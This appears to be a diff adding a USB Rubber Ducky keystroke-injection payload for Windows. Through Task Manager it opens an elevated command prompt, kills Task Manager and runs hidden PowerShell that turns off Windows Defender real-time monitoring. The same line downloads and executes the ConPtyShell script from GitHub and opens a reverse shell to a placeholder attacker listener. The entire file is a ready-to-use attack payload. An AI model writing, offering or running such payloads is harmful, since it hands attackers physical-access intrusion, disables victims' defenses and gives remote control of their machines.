@@ -1,0 +1,23 @@
+REM Change the Following Details.
+REM [LISTENER_IP_ADDRESS] IP Address of the Attacker System.
+REM [PORT] The Port on the target system you want Netcat to listen on.
+
+DELAY 1500
+GUI r
+DELAY 200
+REM --> Opens Task Manager
+STRING taskmgr
+ENTER
+DELAY 1500
+ALT f
+n
+DELAY 100
+STRING cmd
+TAB
+SPACE
+DELAY 50
+ENTER
+DELAY 100
+
+REM --> Kills TaskManager, Executes PowerShell Commands (Hidden), Disables Windows Defender and Executes a Reverse Shell
+STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]");
